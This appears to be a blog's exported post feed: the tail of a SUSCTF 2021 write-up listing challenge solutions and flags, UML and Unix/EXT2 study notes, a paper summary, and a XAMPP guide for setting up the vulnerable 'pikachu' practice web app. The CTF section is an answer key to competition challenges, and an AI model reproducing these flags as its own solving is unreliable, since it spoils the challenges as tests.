result)</span><br><span class="line"><span class="built_in">print</span>(bin_lst)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bin_lst:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<ol>
<li>打印U1VTQ1RGJTdCRDBfeTB1X2wxazNfZDRuYzFuZyU3RA==  </li>
<li>base64解码SUSCTF%7BD0_y0u_l1k3_d4nc1ng%7D  </li>
<li>将左右括号%7B和%7D改过来即可</li>
</ol>
<h2 id="MISC-Word"><a href="#MISC-Word" class="headerlink" title="[MISC] Word"></a>[MISC] Word</h2><h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>word中提示了JPG_encryption，但是并没有发现隐藏图片<br><img src="/2021/03/20/SUS2021-WP/14_word.png" alt>  </li>
<li>将后缀名改为zip再解压缩发现了一个guessguessguess.xml，用010Editor看到其文件头是jfif，将其改为jpg可以打开<br><img src="/2021/03/20/SUS2021-WP/15_gougou.png" alt>  </li>
<li>jpg格式不能隐写，用stegdetect也没检测到什么结果，直到我查到一个工具叫<a href="https://github.com/crorvick/outguess.git">outguess</a>，这个文件名就在疯狂暗示  </li>
<li><code>outguess -k &quot;What_do_you_know_about_JPG_encryption&quot; -r guessguessguess.jpg hidden.txt</code>  </li>
<li>SUSCTF{Congr4tulat1on5_Y0u_gu3ssed_1t}</li>
</ol>
<h2 id="Crypto-ezXOR"><a href="#Crypto-ezXOR" class="headerlink" title="[Crypto] ezXOR"></a>[Crypto] ezXOR</h2><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p><code>xortool -c 20 enc.txt</code><br><img src="/2021/03/20/SUS2021-WP/13_xor.png" alt><br>SUSCTF{XOR_t00l_cAn_so1ve_1t}</p>
<h2 id="Re-0-year-old-re"><a href="#Re-0-year-old-re" class="headerlink" title="[Re] 0-year-old-re"></a>[Re] 0-year-old-re</h2><h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>答案就在明面上D500B61B-9270-41CB-9EB4-FEDF3C5FC101<br><img src="/2021/03/20/SUS2021-WP/14_flag.png" alt>  </li>
</ol>
<h2 id="Misc-签到到到到"><a href="#Misc-签到到到到" class="headerlink" title="[Misc] 签到到到到"></a>[Misc] 签到到到到</h2><h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>先base58再base85，这里借助CyberChef_v8.31.1完成<br><img src="/2021/03/20/SUS2021-WP/16_misc.png" alt>  </li>
<li>SUSCTF{Welc0m3_t0_th3_c0mpet1tion}</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>UML用户指南[笔记]</title>
    <url>/2021/10/28/UML%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h2 id="第一章-为什么要建模"><a href="#第一章-为什么要建模" class="headerlink" title="第一章 为什么要建模"></a>第一章 为什么要建模</h2><h3 id="1-1-建模的四项原理"><a href="#1-1-建模的四项原理" class="headerlink" title="1.1 建模的四项原理"></a>1.1 建模的四项原理</h3><ol>
<li>选择创建什么模型，对如何动手解决问题和如何形成解决方案有着意义深远的影响。</li>
<li>可以在不同的精度级别上表示每一种模型。</li>
<li>最好的模型是与现实相联系的。</li>
<li>单个模型或视图是不充分的。对每个重要的系统最好用一小组几乎独立的模型从多个视角去逼近。</li>
</ol>
<h2 id="第二章-UML介绍"><a href="#第二章-UML介绍" class="headerlink" title="第二章 UML介绍"></a>第二章 UML介绍</h2><h3 id="2-1-UML三要素"><a href="#2-1-UML三要素" class="headerlink" title="2.1 UML三要素"></a>2.1 UML三要素</h3><ol>
<li>UML的基本构造块</li>
<li>构造块的放置规则</li>
<li>一些公共机制</li>
</ol>
<hr>
<p>为了理解系统中的各项事务，需要多个<strong>相互联系</strong>的模型</p>
<hr>
<h3 id="2-2-构造块"><a href="#2-2-构造块" class="headerlink" title="2.2 构造块"></a>2.2 构造块</h3><p><img src="/2021/10/28/UML%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97/image-20211028115617195.png" alt="image-20211028115617195"></p>
<h4 id="2-2-1-结构事物"><a href="#2-2-1-结构事物" class="headerlink" title="2.2.1 结构事物"></a>2.2.1 结构事物</h4><ul>
<li>类（矩形，其中包括类的名称、属性、操作）</li>
</ul>
<p><img src="/2021/10/28/UML%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97/image-20211028162908548.png" alt="image-20211028162908548"></p>
<ul>
<li><p>接口（由类提供的对外接口：用线连接到类框的小圆圈；类向其他类请求的接口：用线连接到类框的半个小圆圈）</p>
<p><img src="/2021/10/28/UML%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97/image-20211028164623026.png" alt="image-20211028164623026"></p>
</li>
<li><p>协作（虚线椭圆）</p>
<p><img src="/2021/10/28/UML%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97/image-20211028164726609.png" alt="image-20211028164726609"></p>
</li>
<li><p>用况（实现椭圆）</p>
</li>
<li><p>主动类：其对象至少拥有一个进程或线程，因此它能启动控制活动。主动类的对象锁表现的元素行为和其他元素的行为并发，除此以外，它和类是一样的。（类的左右外框画成双线）</p>
<p><img src="/2021/10/28/UML%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97/image-20211028165536082.png" alt="image-20211028165536082"></p>
</li>
<li><p>构件（矩形，右上角有特殊图标）</p>
<p><img src="/2021/10/28/UML%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97/image-20211028165611104.png" alt="image-20211028165611104"></p>
</li>
<li><p>制品：如源代码文件、可执行程序、脚本等（矩形，在其名称上方标注关键字<code>&lt;&lt;artifact&gt;&gt;</code>）</p>
<p><img src="/2021/10/28/UML%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97/image-20211028165700190.png" alt="image-20211028165700190"></p>
</li>
<li><p>结点：运行时存在的物理元素，它表示一个计算机资源（立方体）</p>
</li>
</ul>
<p><img src="/2021/10/28/UML%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97/image-20211028165957974.png" alt="image-20211028165957974"></p>
<hr>
<p>制品与结点的区别：</p>
<ul>
<li>制品：物理软件构件</li>
<li>结点：硬件设备</li>
</ul>
<hr>
<h4 id="2-2-2-行为事物"><a href="#2-2-2-行为事物" class="headerlink" title="2.2.2 行为事物"></a>2.2.2 行为事物</h4><ul>
<li><p>交互（一条有方向的带有操作名的直线）</p>
</li>
<li><p>状态机（圆角矩形）</p>
</li>
<li><p>活动（圆角矩形，状态和动作靠不同的语境得以区别）</p>
</li>
</ul>
<h4 id="2-2-3-分组事物"><a href="#2-2-3-分组事物" class="headerlink" title="2.2.3 分组事物"></a>2.2.3 分组事物</h4><ul>
<li><p>包（带标签的文件夹）</p>
<p><img src="/2021/10/28/UML%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97/image-20211028170156914.png" alt="image-20211028170156914"></p>
</li>
</ul>
<h4 id="2-2-4-注释事物"><a href="#2-2-4-注释事物" class="headerlink" title="2.2.4 注释事物"></a>2.2.4 注释事物</h4><ul>
<li><p>注解（右上角是折角的矩形）</p>
<p><img src="/2021/10/28/UML%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97/image-20211028170250614.png" alt="image-20211028170250614"></p>
</li>
</ul>
<h4 id="2-2-5-关系"><a href="#2-2-5-关系" class="headerlink" title="2.2.5 关系"></a>2.2.5 关系</h4><ul>
<li><p>依赖（可能有方向的虚线，偶尔在其上还带有一个标记）</p>
</li>
<li><p>关联（一条实线，可能有方向，偶尔带有一个标记，经常带有修饰）</p>
</li>
<li><p>泛化（子指向父的，一条带有空心箭头的实线）</p>
</li>
<li><p>实现（一条带有空心箭头的虚线）</p>
</li>
</ul>
<h3 id="2-3-UML中的公共机制"><a href="#2-3-UML中的公共机制" class="headerlink" title="2.3 UML中的公共机制"></a>2.3 UML中的公共机制</h3><ol>
<li>详述</li>
<li>修饰</li>
<li>通用划分</li>
<li>扩展机制</li>
</ol>
<h4 id="2-3-1-通用划分"><a href="#2-3-1-通用划分" class="headerlink" title="2.3.1 通用划分"></a>2.3.1 通用划分</h4><ul>
<li><p>方法一：对类和对象的划分</p>
<p>用与类同样的图形符号来表示对象，并且在对象名的下面画一道线。</p>
</li>
</ul>
<p>上图表示，<code>Customer</code>类有3个对象，分别为<code>Jan</code>（它被明确标记为<code>Customer</code>的对象），<code>:Customer</code>（匿名的<code>Customer</code>对象）和<code>Elyse</code>（它在详述中被说明为是一种<code>Customer</code>对象）</p>
<ul>
<li>方法二：接口和实现的分离</li>
</ul>
<p>在这个图中，有一个名称为<code>SpellingWizard.dll</code>的构件，它实现了接口<code>IUnknown</code>和<code>ISpelling</code>，并且还需要一个由其他构件提供的名为<code>IDictionary</code>的接口。</p>
<ul>
<li>方法三：类型和角色的分离</li>
</ul>
<p>类型声明了实体的种类（如对象、属性或参数），角色描述了实体在语境中的含义（如类、构件或协作等）。</p>
<h3 id="2-4-体系结构"><a href="#2-4-体系结构" class="headerlink" title="2.4 体系结构"></a>2.4 体系结构</h3><p>最好用5个互连的视图来描述软件密集型系统的体系结构。每个图是在一个特定的方面对系统的组织和结构进行的投影。  </p>
<ul>
<li>用况视图：描述了形成系统体系结构的动力，由描述可被最终用户、分析人员、测试人员看到的系统行为的用况组成。</li>
<li>设计视图：包含类、接口、协作，它们形成了问题及其解决方案的词汇。</li>
<li>交互视图：展示系统不同部分之间的控制流，包括可能的并发和同步机制。</li>
<li>实现视图：包含了用于装配与发布物理系统的制品。</li>
<li>部署视图：描述组成物理系统的部件的分布、交付、安装。</li>
</ul>
<h2 id="第3章-模型基本介绍"><a href="#第3章-模型基本介绍" class="headerlink" title="第3章 模型基本介绍"></a>第3章 模型基本介绍</h2><h3 id="3-1-机制与制品"><a href="#3-1-机制与制品" class="headerlink" title="3.1 机制与制品"></a>3.1 机制与制品</h3><ul>
<li><strong>机制</strong>：类似，可以使用<strong>顺序图</strong>对事件的次序建模的方式</li>
<li><strong>制品</strong>：可看作文件或者设备</li>
</ul>
<h3 id="3-2-静态与动态模型"><a href="#3-2-静态与动态模型" class="headerlink" title="3.2 静态与动态模型"></a>3.2 静态与动态模型</h3><ul>
<li><strong>静态模型</strong>：常规的体现依赖或继承关系的图</li>
<li><strong>动态模型</strong>：对行为建模的，顺序图这种描述工作机制的模型</li>
</ul>
<h3 id="3-3-模型间的联系"><a href="#3-3-模型间的联系" class="headerlink" title="3.3 模型间的联系"></a>3.3 模型间的联系</h3><p>即前文，UML的4种关系</p>
<h3 id="3-4-对UML的扩展"><a href="#3-4-对UML的扩展" class="headerlink" title="3.4 对UML的扩展"></a>3.4 对UML的扩展</h3><p>我的理解是，一个系统存在不同的观察角度，可以是程序的逻辑视图，也可以是程序的物理制品的视图。</p>
<h2 id="第二部分-对基本结构建模"><a href="#第二部分-对基本结构建模" class="headerlink" title="第二部分 对基本结构建模"></a>第二部分 对基本结构建模</h2><h2 id="第4章-类"><a href="#第4章-类" class="headerlink" title="第4章 类"></a>第4章 类</h2><h3 id="4-1-类、属性、操作和职责"><a href="#4-1-类、属性、操作和职责" class="headerlink" title="4.1 类、属性、操作和职责"></a>4.1 类、属性、操作和职责</h3><h4 id="4-1-1-简单名与限定名"><a href="#4-1-1-简单名与限定名" class="headerlink" title="4.1.1 简单名与限定名"></a>4.1.1 简单名与限定名</h4><ul>
<li><strong>简单名</strong>：单独的名称</li>
<li><strong>限定名</strong>：包的名做前缀</li>
</ul>
<p><img src="/2021/10/28/UML%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97/image-20211104150042972.png" alt="image-20211104150042972"></p>
<h4 id="4-1-2-属性与操作"><a href="#4-1-2-属性与操作" class="headerlink" title="4.1.2 属性与操作"></a>4.1.2 属性与操作</h4><p><strong>属性</strong>可以有声明并给定初始值的方式来详述</p>
<p><img src="/2021/10/28/UML%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97/image-20211104150409702.png" alt="image-20211104150409702"></p>
<p><strong>操作</strong>可以添加标记说明参数的名称、类型和默认值或者返回类型</p>
<p><img src="/2021/10/28/UML%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97/image-20211104150825620.png" alt="image-20211104150825620"></p>
<hr>
<p>注意：不用把所有的属性及操作都放到类中。未列出的以<code>...</code>表示，也可以直接压缩掉这一栏。</p>
<p>衍型：是为了更好地组织属性和操作的长列表而添加的前缀</p>
<p><img src="/2021/10/28/UML%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97/image-20211104151119461.png" alt="image-20211104151119461"></p>
<h4 id="4-1-3-职责"><a href="#4-1-3-职责" class="headerlink" title="4.1.3 职责"></a>4.1.3 职责</h4><p>相当于类的注释</p>
<p><img src="/2021/10/28/UML%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97/image-20211104151420389.png" alt="image-20211104151420389"></p>
<h3 id="4-2-对系统的词汇建模"><a href="#4-2-对系统的词汇建模" class="headerlink" title="4.2 对系统的词汇建模"></a>4.2 对系统的词汇建模</h3>]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>UML</tag>
      </tags>
  </entry>
  <entry>
    <title>Securing Data With Blockchain and AI</title>
    <url>/2020/09/14/With-Blockchain-and-AI/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>Data security, data systems, artificial intelligence, cyberspace</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><p><img src="/2020/09/14/With-Blockchain-and-AI/image-20210524204351643.png" alt="image-20210524204351643"></p>
<ul>
<li>CPS：Cyber Physical Social 信息物理社会融合系统</li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ieeexplore.ieee.org/document/8733072">https://ieeexplore.ieee.org/document/8733072</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>Blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title>解决XAMPP安装后无法启动Apache和MySQL的问题并搭建pikachu环境</title>
    <url>/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/qq_41664447/article/details/81202740">参考</a></p>
<h2 id="1-启动-Apache"><a href="#1-启动-Apache" class="headerlink" title="1 启动 Apache"></a>1 启动 Apache</h2><p>注意这里修改端口号的目的是避免与现存服务冲突，如果原有默认的端口可用，实际上不需要修改</p>
<h3 id="1-1-修改端口号"><a href="#1-1-修改端口号" class="headerlink" title="1.1 修改端口号"></a>1.1 修改端口号</h3><ul>
<li><p>需要修改配置中的端口号，以避免与其他服务冲突</p>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604103954352.png" alt="image-20210604103954352"></p>
<ul>
<li><p>其中右上角整体的配置</p>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604104053107.png" alt="image-20210604104053107"></p>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604104115988.png" alt="image-20210604104115988"></p>
</li>
<li><p>Apache 服务对应的配置也需要同步修改：将 httpd.conf 中所有 80 替换为以上的8081 及 httpd-ssl.conf 中所有 443 替换为 4433，与以上配置相同。</p>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604104214321.png" alt="image-20210604104214321"></p>
</li>
</ul>
</li>
</ul>
<ul>
<li>实际上我走到这一步是没有成功的，点击 start 没有报错，仅提示正在试图启动 Apache 服务，没有其他动静</li>
</ul>
<h3 id="1-2-修改注册表路径"><a href="#1-2-修改注册表路径" class="headerlink" title="1.2 修改注册表路径"></a>1.2 修改注册表路径</h3><ul>
<li>win + R，regedit 进入注册表编辑器</li>
<li><p><code>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Apache2.4</code></p>
</li>
<li><p>找到 ImagePath 将其路径修改为 xampp 目录的 apache 底下 httpd.exe 的绝对路径，根据自己安装情况修改即可 <code>..\xampp\apache\bin\httpd.exe</code></p>
</li>
<li><p>修改完成后即可正常启动</p>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604104813087.png" alt="image-20210604104813087"></p>
</li>
</ul>
<h2 id="2-启动-MySQL"><a href="#2-启动-MySQL" class="headerlink" title="2 启动 MySQL"></a>2 启动 MySQL</h2><h3 id="2-1-修改端口"><a href="#2-1-修改端口" class="headerlink" title="2.1 修改端口"></a>2.1 修改端口</h3><p>同上，将配置文件中的 3306 改为 3316</p>
<h3 id="2-2-重启服务"><a href="#2-2-重启服务" class="headerlink" title="2.2 重启服务"></a>2.2 重启服务</h3><ul>
<li>删除MySQL服务<code>sc delete mysql</code></li>
<li>按 Apache 以上提到注册表信息的内容，找到 MySQL相关并全部删除</li>
<li>找到<code>xampp\mysql</code>目录下的 mysql_start.bat 并启动</li>
<li>关闭 XAMPP 重新以管理员身份打开，并启动 MySQL 服务即可</li>
</ul>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604112516623.png" alt="image-20210604112516623"></p>
<h2 id="3-pikachu-环境"><a href="#3-pikachu-环境" class="headerlink" title="3 pikachu 环境"></a>3 pikachu 环境</h2><p><a href="https://blog.csdn.net/jomos/article/details/106881756">搭建pikachu的环境_jomos的博客-CSDN博客_pikachu搭建</a> 需要修改 MySQL 账户密码，若修改后连不上了则参考下一条</p>
<ul>
<li><p>下载 <a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a> 压缩包</p>
</li>
<li><p>解压到 <code>\xampp\htdocs</code> 下，并将 pikachu-master 改名为 pikachu</p>
<ul>
<li>原因：<code>\xampp\htdocs\pikachu\inc\config.inc.php</code> 中 <code>define(&#39;DBNAME&#39;, &#39;pikachu&#39;);//自定义，建议不修改</code></li>
</ul>
</li>
<li><p>修改上述配置文件 config.inc.php 中端口为 XAMPP 中 MySQL 配置的端口，完成！</p>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604203010242.png" alt="image-20210604203010242"></p>
</li>
<li><p>启动 XAMPP，打开 Apache 和 MySQL 服务，访问 <code>http://localhost:8081/pikachu/</code></p>
</li>
</ul>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604203143811.png" alt="image-20210604203143811"></p>
<ul>
<li><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604212056271.png" alt="image-20210604212056271"></li>
</ul>
<h2 id="4-XAMPP-通过-PHPADMIN-修改密码后连不上了"><a href="#4-XAMPP-通过-PHPADMIN-修改密码后连不上了" class="headerlink" title="4 XAMPP 通过 PHPADMIN 修改密码后连不上了"></a>4 XAMPP 通过 PHPADMIN 修改密码后连不上了</h2><p><a href="https://blog.csdn.net/m0_37468234/article/details/80047785">xampp修改mysql密码后不能登陆_honyliu-CSDN博客</a></p>
<ul>
<li><code>\xampp\phpMyAdmin\config.inc.php</code> 中 <code>$cfg[&#39;Servers&#39;][$i][&#39;password&#39;] = &#39;&#39;;</code> 添加密码</li>
</ul>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604211818520.png" alt="image-20210604211818520"></p>
]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>XAMPP</tag>
        <tag>pikachu</tag>
      </tags>
  </entry>
  <entry>
    <title>Unix/Linux系统编程[笔记]</title>
    <url>/2021/06/20/Unix%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="2-编程背景"><a href="#2-编程背景" class="headerlink" title="2 编程背景"></a>2 编程背景</h2><h3 id="2-3-程序开发"><a href="#2-3-程序开发" class="headerlink" title="2.3 程序开发"></a>2.3 程序开发</h3><h4 id="2-3-1-C-语言变量"><a href="#2-3-1-C-语言变量" class="headerlink" title="2.3.1 C 语言变量"></a>2.3.1 C 语言变量</h4><p><img src="/2021/06/20/Unix%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/image-20210620220047647.png" alt="image-20210620220047647"></p>
<ul>
<li><strong>静态全局变量</strong>只对定义它们的文件可见，<strong>非静态全局变量</strong>对同一程序的所有文件可见。</li>
</ul>
<h4 id="2-3-2-程序开发步骤"><a href="#2-3-2-程序开发步骤" class="headerlink" title="2.3.2 程序开发步骤"></a>2.3.2 程序开发步骤</h4><p>预处理、编译（.s）、汇编（.o）、链接（.out）</p>
<h5 id="o-文件的组成"><a href="#o-文件的组成" class="headerlink" title=".o 文件的组成"></a>.o 文件的组成</h5><ul>
<li>文件头 + 代码段 + 数据段 + BSS + 重定位信息 + 符号表</li>
</ul>
<h5 id="链接的主要操作"><a href="#链接的主要操作" class="headerlink" title="链接的主要操作"></a>链接的主要操作</h5><ul>
<li>合成各段（代码段、数据段、BSS段）</li>
<li>根据重定位信息调整各段偏移量</li>
<li>用符号表解析各 .o 文件的交叉引用</li>
</ul>
<h4 id="2-3-2-静态与动态链接"><a href="#2-3-2-静态与动态链接" class="headerlink" title="2.3.2 静态与动态链接"></a>2.3.2 静态与动态链接</h4><ul>
<li>静态：所有库函数都加入 a.out</li>
<li>动态：库函数不存入 a.out，a.out 存放调用指令，然后执行期间按需加载</li>
</ul>
<h4 id="2-3-3-可执行文件格式"><a href="#2-3-3-可执行文件格式" class="headerlink" title="2.3.3 可执行文件格式"></a>2.3.3 可执行文件格式</h4><ul>
<li>二进制可执行平面文件：仅包含可执行代码和初始化数据。（比如，可启动操作系统映像（简化了引导装载程序））</li>
<li>a.out 可执行文件</li>
<li>ELF 文件</li>
</ul>
<h4 id="2-3-4-a-out-的内容"><a href="#2-3-4-a-out-的内容" class="headerlink" title="2.3.4 a.out 的内容"></a>2.3.4 a.out 的内容</h4><ul>
<li>文件头（各段大小） + 代码段 + 数据段 + 符号表</li>
</ul>
<p><strong>注意：</strong>BSS 段不在 a.out 中，只有 BSS 段的大小记录在 a.out 文件头中</p>
<h4 id="2-3-5-程序终止过程"><a href="#2-3-5-程序终止过程" class="headerlink" title="2.3.5 程序终止过程"></a>2.3.5 程序终止过程</h4><h5 id="a-正常终止"><a href="#a-正常终止" class="headerlink" title="a. 正常终止"></a>a. 正常终止</h5><ol>
<li>清理工作 <code>exit(value)</code>：刷新 stdout，关闭 I/O 流</li>
<li>系统调用 <code>__exit(value)</code>：<ul>
<li>记录退出状态</li>
<li>通知父进程，并使该进程称为僵尸进程</li>
<li>父进程 wait 僵尸进程，清空僵尸子进程结构体</li>
</ul>
</li>
</ol>
<h5 id="b-异常终止"><a href="#b-异常终止" class="headerlink" title="b. 异常终止"></a>b. 异常终止</h5><ol>
<li>陷入操作系统内核</li>
<li>内核的陷入处理程序将陷入错误类型转换成一个<strong>幻数</strong>（信号）</li>
<li>将信号传递给进程，使进程终止 </li>
</ol>
<h2 id="11-EXT2-文件系统"><a href="#11-EXT2-文件系统" class="headerlink" title="11 EXT2 文件系统"></a>11 EXT2 文件系统</h2><p>EXT3：增加日志</p>
<p>EXT4：主要变化是磁盘块的分配</p>
<h3 id="11-1-简单的-EXT2-文件系统布局"><a href="#11-1-简单的-EXT2-文件系统布局" class="headerlink" title="11.1 简单的 EXT2 文件系统布局"></a>11.1 简单的 EXT2 文件系统布局</h3><div class="table-container">
<table>
<thead>
<tr>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3-7</th>
<th>8</th>
<th>9</th>
<th>10…32</th>
<th>33…1439</th>
</tr>
</thead>
<tbody>
<tr>
<td>boot(引导块)</td>
<td>super(超级块)</td>
<td>GB(块组描述符)</td>
<td>reserved(保留区)</td>
<td>bmap(块位图)</td>
<td>imap(索引节点位图)</td>
<td>inodes blocks(索引节点块)</td>
<td>data blocks(数据块)</td>
</tr>
</tbody>
</table>
</div>
<h3 id="11-2-超级块结构"><a href="#11-2-超级块结构" class="headerlink" title="11.2 超级块结构"></a>11.2 超级块结构</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext2_super_block</span> &#123;</span></span><br><span class="line">    u32 s_inodes_count; 		<span class="comment">/* Inodes count */</span></span><br><span class="line">    u32 s_blocks_ccount;		<span class="comment">/* Blocks count */</span></span><br><span class="line">    u32 s_r_blocks_count; 		<span class="comment">/* Reserved blocks count */</span></span><br><span class="line">    u32 s_free_blocks_count; 	<span class="comment">/* Free blocks count */</span></span><br><span class="line">    u32 s_free_inodes_count; 	<span class="comment">/* Free inodes count */</span></span><br><span class="line">    u32 s_first_data_block;		<span class="comment">/* First data block */</span></span><br><span class="line">    u32 s_log_block_size; 		<span class="comment">/* Block size */</span></span><br><span class="line">    u32 s_log_cluster_size; 	<span class="comment">/* Allocation cluster size */</span></span><br><span class="line">    u32 s_blocks_per_group;		<span class="comment">/* # Block per group */</span></span><br><span class="line">    u32 s_cluster_per_group;	<span class="comment">/* # Fragments per group */</span></span><br><span class="line">    u32 s_inodes_per_group;		<span class="comment">/* # Inodes per group */</span></span><br><span class="line">    u32 s_mtime;				<span class="comment">/* Mount time */</span></span><br><span class="line">    u32 s_wtime;				<span class="comment">/* Write time */</span></span><br><span class="line">    u32 s_mnt_count;			<span class="comment">/* Mount count */</span></span><br><span class="line">    s16 s_max_mnt_count;		<span class="comment">/* Maximal mount count */</span></span><br><span class="line">    u16 s_magic; 				<span class="comment">/* Magic signature */</span></span><br><span class="line">    <span class="comment">// more non-essential fields</span></span><br><span class="line">    u16 s_inode_size;			<span class="comment">/* size of inode structure */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>索引节点数目</li>
<li>块数目</li>
<li>起始块地址</li>
<li>文件块大小</li>
<li>已挂载文件系统的次数</li>
<li>幻数（标识文件系统类型）</li>
</ul>
<h3 id="11-3-块组描述符结构"><a href="#11-3-块组描述符结构" class="headerlink" title="11.3 块组描述符结构"></a>11.3 块组描述符结构</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext2_group_desc</span> &#123;</span></span><br><span class="line">    u32 bg_block_bitmap; 	<span class="comment">// 块位图起始块</span></span><br><span class="line">    u32 bg_inode_bitmap;	<span class="comment">// 索引节点位图起始块</span></span><br><span class="line">    u32 bg_inode_table;		<span class="comment">// 索引节点起始块</span></span><br><span class="line">    u16 bg_free_blocks_count;</span><br><span class="line">    u16 bg_free_inodes_count;</span><br><span class="line">    u16 bg_used_dirs_count;</span><br><span class="line">    u16 bg_pad;</span><br><span class="line">    u16 bg_reserved[<span class="number">3</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中最重要的字段是前三个</p>
<h3 id="11-4-块位图和索引节点位图"><a href="#11-4-块位图和索引节点位图" class="headerlink" title="11.4 块位图和索引节点位图"></a>11.4 块位图和索引节点位图</h3><h4 id="11-4-1-块位图-bg-block-bitmap"><a href="#11-4-1-块位图-bg-block-bitmap" class="headerlink" title="11.4.1 块位图 bg_block_bitmap"></a>11.4.1 块位图 bg_block_bitmap</h4><p>位图用于表示某种项的位序列，如磁盘块或索引节点。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>位图的值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>对应项处于 FREE 状态</td>
</tr>
<tr>
<td>1</td>
<td>对应项处于 IN_USE  状态</td>
</tr>
</tbody>
</table>
</div>
<h4 id="11-4-2-索引节点位图-bg-inode-bitmap"><a href="#11-4-2-索引节点位图-bg-inode-bitmap" class="headerlink" title="11.4.2 索引节点位图 bg_inode_bitmap"></a>11.4.2 索引节点位图 bg_inode_bitmap</h4><p>索引节点位图是用来代表一个文件的数据结构。<font color="blue">EXT2 文件系统是使用有限数量的索引节点创建的，各索引节点的状态用索引节点位图的一个位表示。</font></p>
<p>在 EXT2 文件系统中，前 10 个索引节点是预留的，所以空 EXT2 FS 的 Imap 以 10 个 1 开头，然后是 0。</p>
<h3 id="11-5-索引节点-bg-inode-table"><a href="#11-5-索引节点-bg-inode-table" class="headerlink" title="11.5 索引节点 bg_inode_table"></a>11.5 索引节点 bg_inode_table</h3><p>EXT2 每个文件都用一个 128 字节的唯一索引节点结构体表示（EXT4 是 256 字节）</p>
